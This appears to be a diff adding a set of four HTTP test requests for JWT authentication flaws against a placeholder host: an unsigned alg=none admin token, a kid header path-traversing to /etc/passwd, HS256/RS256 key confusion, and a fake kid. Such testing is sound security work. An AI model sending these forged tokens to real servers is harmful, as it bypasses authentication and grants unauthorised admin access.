@@ -1,0 +1,29 @@
+ ### 🚨 Test #1: alg=none, unsigned token
+
+GET /admin HTTP/1.1
+Host: vulnerable.site
+Authorization: Bearer eyJhbGciOiJub25lIn0.eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoiYWRtaW4ifQ.
+
+###
+
+### 🔧 Test #2: HS256 token with malicious KID
+
+GET /admin HTTP/1.1
+Host: vulnerable.site
+Authorization: Bearer <INSERT_HS256_TOKEN_WITH_KID=../../../../etc/passwd>
+
+###
+
+### 🧬 Test #3: HMAC using server’s public key
+
+GET /admin HTTP/1.1
+Host: vulnerable.site
+Authorization: Bearer <INSERT_HS256_TOKEN_SIGNED_WITH_PUBLIC_KEY>
+
+###
+
+### ❌ Test #4: Invalid KID test (RS256)
+
+GET /admin HTTP/1.1
+Host: vulnerable.site
+Authorization: Bearer <RS256_FAKE_KID_TOKEN>
